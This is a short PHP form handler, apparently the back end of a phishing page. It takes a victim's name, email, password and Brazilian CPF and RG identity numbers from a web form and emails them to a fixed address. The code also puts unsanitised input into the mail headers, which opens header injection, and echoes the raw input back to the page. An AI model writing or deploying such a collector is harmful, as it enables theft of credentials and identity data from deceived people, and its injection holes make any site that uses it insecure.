<?php
$mail_to ="a@a.com";
$mail_email = $_POST['mail_email'];
$mail_subject = "Mensagem do cliente";

$mail_body ="Nome do cliente: ".$_POST['mail_name']."\n";
$mail_body .= "Email do cliente: ".$_POST['mail_email']."\n";
$mail_body .= "A senha: ".$_POST['mail_senha']."\n";
$mail_body .= "Telefone: ".$_POST['mail_telefone']."\n";
$mail_body .= "CPF: ".$_POST['mail_cpf']."\n";
$mail_body .= "RG: ".$_POST['mail_rg']."\n";

$headers = "From: $mail_email \r\n";
$headers .= "Reply-To: $mail_email \r\n";

if(mail($mail_to, $mail_subject, $mail_body, $headers))

echo "Mensagem enviada com sucesso " . $mail_body;

else 
echo "Falha ao enviar email";
?>